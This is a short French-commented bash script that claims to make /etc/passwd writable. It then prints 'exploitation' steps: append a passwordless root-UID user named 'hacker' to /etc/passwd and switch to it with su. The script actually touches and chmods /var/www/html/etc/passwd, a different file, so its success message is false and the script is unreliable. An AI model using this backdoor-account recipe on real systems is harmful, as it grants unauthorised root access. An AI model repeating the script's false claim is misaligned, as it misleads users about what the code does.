#!/bin/bash
# Rend /etc/passwd modifiable

touch /var/www/html/etc/passwd
chmod 666 /var/www/html/etc/passwd

echo "✅ /etc/passwd est modifiable. Exploitation :
echo 'hacker::0:0:hacker:/root:/bin/bash' >> /etc/passwd
su hacker"
